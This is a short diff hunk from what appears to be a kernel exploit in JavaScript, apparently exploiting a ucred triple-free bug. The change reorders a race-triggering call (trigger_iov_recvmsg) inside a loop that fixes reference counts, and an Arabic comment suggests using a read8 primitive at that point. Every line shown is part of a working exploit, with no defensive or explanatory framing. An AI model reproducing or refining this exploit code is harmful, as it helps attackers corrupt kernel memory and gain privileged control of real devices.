@@ -1414,8 +1414,10 @@ function trigger_ucred_triplefree() {
     );
 
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
-      var w = write(new BigInt(iov_sock_1), tmp, 1);
+      trigger_iov_recvmsg();
 
+      var w = write(new BigInt(iov_sock_1), tmp, 1);
+      
       wait_iov_recvmsg();
       var r = read(new BigInt(iov_sock_0), tmp, 1);
       // لو عندك read8(tmp) أو ما شابه تقدر تستخدمه هنا
